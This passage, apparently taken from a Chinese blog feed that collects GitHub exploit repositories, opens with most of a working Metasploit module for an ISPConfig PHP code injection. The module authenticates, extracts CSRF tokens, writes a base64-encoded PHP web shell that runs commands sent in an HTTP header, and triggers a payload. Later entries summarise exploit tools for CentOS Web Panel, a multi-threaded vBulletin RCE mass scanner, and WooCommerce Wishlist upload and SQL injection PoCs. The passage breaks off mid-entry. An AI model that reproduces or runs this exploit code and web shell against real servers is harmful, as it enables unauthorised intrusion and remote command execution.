=&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;password&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>],<br>        <span class="hljs-string">&#x27;s_mod&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;, datastore[<span class="hljs-string">&#x27;LOGIN_TIMEOUT&#x27;</span>])<br>    fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Login request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">if</span> res.body.match(<span class="hljs-regexp">/Username or Password wrong/i</span>)<br>      fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Login failed: Invalid credentials&#x27;</span>)<br>    end<br>    <span class="hljs-keyword">if</span> res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>] &amp;&amp; res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>].include?(<span class="hljs-string">&#x27;admin&#x27;</span>) ||<br>       res.body.downcase.include?(<span class="hljs-string">&#x27;dashboard&#x27;</span>)<br>      print_good(<span class="hljs-string">&#x27;Login successful!&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    end<br>    print_warning(<span class="hljs-string">&#x27;Login status unclear, attempting to continue...&#x27;</span>)<br>    <span class="hljs-literal">true</span><br>  end<br><br>  def generate_random_string(length = <span class="hljs-number">10</span>)<br>    charset = (<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>).to_a<br>    <span class="hljs-built_in">Array</span>.<span class="hljs-keyword">new</span>(length) &#123; charset.sample &#125;.join<br>  end<br><br>  def generate_shell_code<br>    print_status(<span class="hljs-string">&#x27;Generating PHP payload...&#x27;</span>)<br>    php_payload = payload.encoded<br>    php_shell = %Q&#123;&lt;?php<span class="hljs-string">\nprint(&#x27;____SHELL_START____&#x27;);\nif(isset($_SERVER[&#x27;HTTP_CMD&#x27;]))</span> &#123;<span class="hljs-string">\n</span>  $cmd = base64_decode($_SERVER[<span class="hljs-string">&#x27;HTTP_CMD&#x27;</span>]);<span class="hljs-string">\n</span>  <span class="hljs-keyword">if</span>($cmd == <span class="hljs-string">&#x27;PAYLOAD_TRIGGER&#x27;</span>) &#123;<span class="hljs-string">\n</span>    <span class="hljs-comment">#&#123;php_payload&#125;\n  &#125; elseif($cmd) &#123;\n    passthru($cmd);\n  &#125;\n&#125; else &#123;\n  #&#123;php_payload&#125;\n&#125;\nprint(&#x27;____SHELL_END____&#x27;);\n?&gt;&#125;</span><br>    Rex::Text.encode_base64(php_shell)<br>  end<br><br>  def inject_shell<br>    print_status(<span class="hljs-string">&#x27;Injecting PHP shell...&#x27;</span>)<br>    @shell_file = <span class="hljs-string">&quot;sh_<span class="hljs-subst">#&#123;generate_random_string&#125;</span>.php&quot;</span><br>    php_code = generate_shell_code<br>    injection = <span class="hljs-string">&quot;&#x27;];file_put_contents(&#x27;<span class="hljs-subst">#&#123;@shell_file&#125;</span>&#x27;,base64_decode(&#x27;<span class="hljs-subst">#&#123;php_code&#125;</span>&#x27;));die;#&quot;</span><br>    lang_file = generate_random_string + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;, <span class="hljs-number">10</span>)<br>    fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Unable to access language_edit.php&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    csrf_id_match = res.body.match(<span class="hljs-regexp">/_csrf_id&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    csrf_key_match = res.body.match(<span class="hljs-regexp">/_csrf_key&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    <span class="hljs-keyword">unless</span> csrf_id_match &amp;&amp; csrf_key_match<br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;CSRF tokens not found!&#x27;</span>)<br>    end<br>    csrf_id = csrf_id_match[<span class="hljs-number">1</span>]<br>    csrf_key = csrf_key_match[<span class="hljs-number">1</span>]<br>    print_good(<span class="hljs-string">&quot;CSRF tokens extracted: ID=<span class="hljs-subst">#&#123;csrf_id[<span class="hljs-number">0.</span>.<span class="hljs-number">10</span>]&#125;</span>..., KEY=<span class="hljs-subst">#&#123;csrf_key[<span class="hljs-number">0.</span>.<span class="hljs-number">10</span>]&#125;</span>...&quot;</span>)<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\\]&#x27;</span> =&gt; injection<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;, <span class="hljs-number">10</span>)<br>    fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Injection request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    shell_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, @shell_file)<br>    print_status(<span class="hljs-string">&#x27;Verifying shell injection...&#x27;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; shell_url,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;, <span class="hljs-number">5</span>)<br>    <span class="hljs-keyword">if</span> res &amp;&amp; res.body.include?(<span class="hljs-string">&#x27;SHELL_START&#x27;</span>) &amp;&amp; res.body.include?(<span class="hljs-string">&#x27;SHELL_END&#x27;</span>)<br>      print_good(<span class="hljs-string">&quot;Shell successfully injected: <span class="hljs-subst">#&#123;@shell_file&#125;</span>&quot;</span>)<br>      register_file_for_cleanup(@shell_file) <span class="hljs-keyword">if</span> datastore[<span class="hljs-string">&#x27;DELETE_SHELL&#x27;</span>]<br>      <span class="hljs-keyword">return</span> shell_url<br>    <span class="hljs-keyword">else</span><br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Shell injection failed or shell not accessible&#x27;</span>)<br>    end<br>  end<br><br>  def execute_command(command, shell_uri = nil)<br>    <span class="hljs-keyword">return</span> nil <span class="hljs-keyword">unless</span> @shell_file<br>    shell_url = shell_uri || normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, @shell_file)<br>    encoded_cmd = Rex::Text.encode_base64(command)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; shell_url,<br>      <span class="hljs-string">&#x27;headers&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;CMD&#x27;</span> =&gt; encoded_cmd<br>      &#125;,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;, <span class="hljs-number">15</span>)<br>    <span class="hljs-keyword">return</span> nil <span class="hljs-keyword">unless</span> res<br>    output_match = res.body.match(<span class="hljs-regexp">/____SHELL_START____(.*?)____SHELL_END____/m</span>)<br>    <span class="hljs-keyword">return</span> output_match[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> output_match<br>    nil<br>  end<br><br>  def trigger_payload(shell_uri)<br>    print_status(<span class="hljs-string">&#x27;Triggering PHP payload...&#x27;</span>)<br>    framework.threads.spawn(<span class="hljs-string">&#x27;PayloadTrigger&#x27;</span>, <span class="hljs-literal">false</span>) <span class="hljs-keyword">do</span><br>      send_request_cgi(&#123;<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>        <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; shell_uri,<br>        <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>      &#125;, <span class="hljs-number">10</span>)<br>    end<br>    framework.threads.spawn(<span class="hljs-string">&#x27;PayloadTriggerManual&#x27;</span>, <span class="hljs-literal">false</span>) <span class="hljs-keyword">do</span><br>      select(nil, nil, nil, <span class="hljs-number">2</span>)<br>      execute_command(<span class="hljs-string">&#x27;PAYLOAD_TRIGGER&#x27;</span>, shell_uri)<br>    end<br>    print_good(<span class="hljs-string">&#x27;PHP payload triggered&#x27;</span>)<br>  end<br><br>  def exploit<br>    authenticate<br>    shell_uri = inject_shell<br>    print_status(<span class="hljs-string">&#x27;Starting payload handler...&#x27;</span>)<br>    trigger_payload(shell_uri)<br>    print_status(<span class="hljs-string">&#x27;Waiting for session...&#x27;</span>)<br>    select(nil, nil, nil, <span class="hljs-number">5</span>)<br>    <span class="hljs-keyword">if</span> framework.sessions.length == <span class="hljs-number">0</span><br>      print_warning(<span class="hljs-string">&#x27;No session established automatically&#x27;</span>)<br>      print_status(<span class="hljs-string">&#x27;Testing shell functionality...&#x27;</span>)<br>      output = execute_command(<span class="hljs-string">&#x27;id&#x27;</span>, shell_uri)<br>      <span class="hljs-keyword">if</span> output<br>        print_good(<span class="hljs-string">&quot;Shell responsive: <span class="hljs-subst">#&#123;output.strip&#125;</span>&quot;</span>)<br>        print_line(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&#x27;=&#x27;</span> * <span class="hljs-number">60</span>)<br>        print_status(<span class="hljs-string">&#x27;Shell Access Information:&#x27;</span>)<br>        print_line(<span class="hljs-string">&quot;URL: <span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;shell_uri&#125;</span>&quot;</span>)<br>        print_line(<span class="hljs-string">&quot;Usage: Send base64 encoded commands via &#x27;CMD&#x27; HTTP header&quot;</span>)<br>        print_line(<span class="hljs-string">&quot;Manual trigger: curl &#x27;<span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;shell_uri&#125;</span>&#x27;&quot;</span>)<br>        print_line(<span class="hljs-string">&quot;Command example: curl -H &#x27;CMD: <span class="hljs-subst">#&#123;Rex::Text.encode_base64(<span class="hljs-string">&#x27;id&#x27;</span>)&#125;</span>&#x27; &#x27;<span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;shell_uri&#125;</span>&#x27;&quot;</span>)<br>        print_line(<span class="hljs-string">&#x27;=&#x27;</span> * <span class="hljs-number">60</span>)<br>      <span class="hljs-keyword">else</span><br>        print_error(<span class="hljs-string">&#x27;Shell test failed&#x27;</span>)<br>        print_line(<span class="hljs-string">&quot;Manual test: curl &#x27;<span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;shell_uri&#125;</span>&#x27;&quot;</span>)<br>      end<br>    end<br>  end<br>end<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; ISPConfig language_edit.php PHP代码注入漏洞&lt;/</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
    <category term="代码注入" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Cent OS Web Panel 远程代码执行漏洞</title>
    <link href="http://example.com/2025/06/25/github_2876617231/"/>
    <id>http://example.com/2025/06/25/github_2876617231/</id>
    <published>2025-06-25T21:15:13.442Z</published>
    <updated>2025-06-25T21:15:13.437Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Cent OS Web Panel 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-48703</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Cent OS Web Panel 存在远程代码执行漏洞，攻击者可通过此漏洞在服务器上执行任意代码。</p><p><strong>产品名称：</strong> Cent OS Web Panel</p><p><strong>来源：</strong> <a href="https://github.com/trh4ckn0n/CVE-2025-48703">https://github.com/trh4ckn0n/CVE-2025-48703</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>LICENSE</li><li>README.md</li><li>app.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-48703"><a href="#CVE-2025-48703" class="headerlink" title="CVE-2025-48703"></a>CVE-2025-48703</h2><p>Remote code exec cent os web panel by trhacknon</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Cent OS Web Panel 远程代码执行漏洞&lt;/p&gt;
&lt;p&gt;&lt;stro</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
  </entry>
  
  <entry>
    <title>vBulletin Remote Code Execution Vulnerability</title>
    <link href="http://example.com/2025/06/25/github_172225911/"/>
    <id>http://example.com/2025/06/25/github_172225911/</id>
    <published>2025-06-25T20:45:18.445Z</published>
    <updated>2025-06-25T20:45:18.443Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> vBulletin Remote Code Execution Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-48828</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 此Python工具自动化检测vBulletin中通过<code>replaceAdTemplate</code>利用向量的未认证远程代码执行漏洞。基于EgiX的原始概念验证，此版本支持批量扫描、多线程，并将确认易受攻击的目标记录到<code>vuln.txt</code>。漏洞影响使用<code>ajax/api/ad/replaceAdTemplate</code>路由的vBulletin易受攻击版本，导致未认证远程代码执行。</p><p><strong>产品厂商：</strong> vBulletin</p><p><strong>产品名称：</strong> vBulletin</p><p><strong>来源：</strong> <a href="https://github.com/ill-deed/vBulletin-CVE-2025-48828-Multi-target">https://github.com/ill-deed/vBulletin-CVE-2025-48828-Multi-target</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>LICENSE</li><li>README.md</li><li>scanner.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="💥-vBulletin-Remote-Code-Execution-Scanner-replaceAdTemplate"><a href="#💥-vBulletin-Remote-Code-Execution-Scanner-replaceAdTemplate" class="headerlink" title="💥 vBulletin Remote Code Execution Scanner (replaceAdTemplate)"></a>💥 vBulletin Remote Code Execution Scanner (replaceAdTemplate)</h2><p>This Python tool automates the detection of <strong>unauthenticated RCE</strong> vulnerabilities in <strong>vBulletin</strong> via the <code>replaceAdTemplate</code> exploit vector. Based on the original proof-of-concept by <strong>EgiX</strong>, this version supports <strong>batch scanning</strong>, <strong>multithreading</strong>, and logs confirmed vulnerable targets to <code>vuln.txt</code>.</p><h3 id="🔥-Vulnerability-Details"><a href="#🔥-Vulnerability-Details" class="headerlink" title="🔥 Vulnerability Details"></a>🔥 Vulnerability Details</h3><ul><li><strong>Exploit Name</strong>: <code>replaceAdTemplate</code> RCE</li><li><strong>CVE</strong>: CVE-2025-48828</li><li><strong>Affected</strong>: Vulnerable versions of vBulletin using the <code>ajax/api/ad/replaceAdTemplate</code> route</li><li><strong>Impact</strong>: Remote Code Execution (unauthenticated)</li></ul><h3 id="⚙️-Features"><a href="#⚙️-Features" class="headerlink" title="⚙️ Features"></a>⚙️ Features</h3><ul><li>🧠 Automatic command execution (<code>id</code>) to confirm RCE</li><li>🔎 Batch scan from a file (<code>targets.txt</code>)</li><li>⚡ Fast, multi-threaded scanner</li><li>🧾 Logs vulnerable targets and their output to <code>vuln.txt</code></li><li>💬 Clean, modular codebase</li></ul><h3 id="📦-Requirements"><a href="#📦-Requirements" class="headerlink" title="📦 Requirements"></a>📦 Requirements</h3><ul><li>Python 3.x</li><li><code>requests</code> module</li></ul><p>Install dependencies (if not already installed):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install requests<br></code></pre></td></tr></table></figure><h3 id="📂-Usage"><a href="#📂-Usage" class="headerlink" title="📂 Usage"></a>📂 Usage</h3><ol><li>Prepare your target list<br>Create a file named targets.txt and add one target URL per line:</li></ol><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">http://example.com/vb/<br>https://target.net/forum/<br><span class="hljs-number">192.168.1.100:8080</span>/vb/<br></code></pre></td></tr></table></figure><ol start="2"><li>Run the scanner:</li></ol><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> scanner.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure><ol start="3"><li>Check vuln.txt for results:</li></ol><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">http</span>://victim.com/vb | uid=<span class="hljs-number">33</span>(www-<span class="hljs-class"><span class="hljs-keyword">data</span>) gid=33(<span class="hljs-title">www</span>-<span class="hljs-title">data</span>) groups=33(<span class="hljs-title">www</span>-<span class="hljs-title">data</span>)</span><br></code></pre></td></tr></table></figure><h3 id="⚙️-Configuration"><a href="#⚙️-Configuration" class="headerlink" title="⚙️ Configuration"></a>⚙️ Configuration</h3><p>You can change these settings in the script:</p><p>COMMAND: Shell command to execute (default: id)</p><p>EXPECTED_OUTPUT: Expected substring to confirm execution (default: uid&#x3D;)</p><p>THREADS: Number of concurrent scans (default: 20)</p><p>TARGET_FILE: Input file of domains (default: targets.txt)</p><p>OUTPUT_FILE: Output log file (default: vuln.txt)</p><h3 id="⚠️-Disclaimer"><a href="#⚠️-Disclaimer" class="headerlink" title="⚠️ Disclaimer"></a>⚠️ Disclaimer</h3><p>This code is provided for educational and authorized security testing purposes only. Unauthorized use against systems without permission is illegal. The author and contributors are not responsible for misuse or damage caused by this software.</p><h3 id="🙏-Credits"><a href="#🙏-Credits" class="headerlink" title="🙏 Credits"></a>🙏 Credits</h3><p>Original exploit author: EgiX</p><p>Python adaptation &amp; batch scanner: ill deed</p><h3 id="📄-License"><a href="#📄-License" class="headerlink" title="📄 License"></a>📄 License</h3><p>MIT License – use responsibly.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; vBulletin Remote Code Execution Vulnera</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
  </entry>
  
  <entry>
    <title>TI WooCommerce Wishlist 文件上传漏洞</title>
    <link href="http://example.com/2025/06/25/github_677953901/"/>
    <id>http://example.com/2025/06/25/github_677953901/</id>
    <published>2025-06-25T20:15:43.431Z</published>
    <updated>2025-06-25T20:15:43.426Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> TI WooCommerce Wishlist 文件上传漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-47577</li></ul><p><strong>漏洞类型：</strong> 文件上传</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> TI WooCommerce Wishlist WordPress插件2.9.2及以下版本存在文件上传漏洞，攻击者可以利用此漏洞上传恶意文件，可能导致服务器被入侵。</p><p><strong>产品厂商：</strong> TI</p><p><strong>产品名称：</strong> TI WooCommerce Wishlist</p><p><strong>影响版本：</strong> &lt;&#x3D; 2.9.2</p><p><strong>来源：</strong> <a href="https://github.com/sug4r-wr41th/CVE-2025-47577">https://github.com/sug4r-wr41th/CVE-2025-47577</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>CVE-2025-47577.py</li><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-47577"><a href="#CVE-2025-47577" class="headerlink" title="CVE-2025-47577"></a>CVE-2025-47577</h2><p>A proof of concept developed to exploit <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47577">CVE-2025-47577</a>. Based on PatchStack’s <a href="https://patchstack.com/articles/unpatched-critical-vulnerability-in-ti-woocommerce-wishlist-plugin/">article</a>.</p><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">usage: python CVE<span class="hljs-number">-2025</span><span class="hljs-number">-47577.</span>py <span class="hljs-comment">--help</span><br><br>TI WooCommerce Wishlist (WordPress plugin) &lt;= <span class="hljs-number">2.9</span><span class="hljs-number">.2</span> CVE<span class="hljs-number">-2025</span><span class="hljs-number">-47577</span> PoC<br><br>positional arguments:<br>  FILE           <span class="hljs-built_in">local</span> <span class="hljs-built_in">file</span> <span class="hljs-built_in">to</span> upload<br>  URL_PATH       base path <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> wish list<br>  PRODUCT_ID     ID <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> product <span class="hljs-built_in">to</span> <span class="hljs-built_in">add</span><br><br>optional arguments:<br>  -h, <span class="hljs-comment">--help     show this help message and exit</span><br>  <span class="hljs-comment">--https        use HTTPS?</span><br>  <span class="hljs-comment">--RHOST RHOST  remote host</span><br>  <span class="hljs-comment">--RPORT RPORT  remote port</span><br>  -v, <span class="hljs-comment">--version  show program&#x27;s version number and exit</span><br></code></pre></td></tr></table></figure><h2 id="Affected-Versions"><a href="#Affected-Versions" class="headerlink" title="Affected Versions"></a>Affected Versions</h2><p>All versions of TI WooCommerce Wishlist (WordPress plugin) &lt;&#x3D; 2.9.2</p><h2 id="Patch-Guidance"><a href="#Patch-Guidance" class="headerlink" title="Patch Guidance"></a>Patch Guidance</h2><p>Upgrade to the latest version available.</p><h2 id="Authors"><a href="#Authors" class="headerlink" title="Authors"></a>Authors</h2><p>Made by <a href="https://github.com/sug4r-wr41th">@sug4r-wr41th</a></p><h2 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h2><p>Fair Use disclaimer: for educational purposes only.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; TI WooCommerce Wishlist 文件上传漏洞&lt;/p&gt;
&lt;p&gt;&lt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>TI WooCommerce Wishlist SQL注入漏洞</title>
    <link href="http://example.com/2025/06/25/github_4287766788/"/>
    <id>http://example.com/2025/06/25/github_4287766788/</id>
    <published>2025-06-25T20:15:31.539Z</published>
    <updated>2025-06-25T20:15:31.538Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> TI WooCommerce Wishlist SQL注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-43917</li></ul><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> TI WooCommerce Wishlist WordPress插件&lt;&#x3D;2.8.2版本中存在SQL注入漏洞，攻击者可以利用该漏洞执行任意SQL命令。</p><p><strong>产品厂商：</strong> TI</p><p><strong>产品名称：</strong> TI WooCommerce Wishlist (WordPress plugin)</p><p><strong>影响版本：</strong> &lt;&#x3D; 2.8.2</p><p><strong>来源：</strong> <a href="https://github.com/sug4r-wr41th/CVE-2024-43917">https://github.com/sug4r-wr41th/CVE-2024-43917</a></p><p><strong>类型：</strong> CVE-2024:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>CVE-2024-43917.py</li><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2024-43917"><a href="#CVE-2024-43917" class="headerlink" title="CVE-2024-43917"></a>CVE-2024-43917</h2><p>A proof of concept developed to exploit <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43917">CVE-2024-43917</a>. Based on PatchStack’s <a href="https://patchstack.com/articles/unpatched-sql-injection-vulnerability-in-ti-woocommerce-wishlist-plugin/">article</a>.</p><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs smali">usage: python CVE-2024-43917.py --help<br><br>TI WooCommerce Wishlist (WordPress plugin) &lt;= 2.8.2 CVE-2024-43917 PoC<br><br>positional arguments:<br>  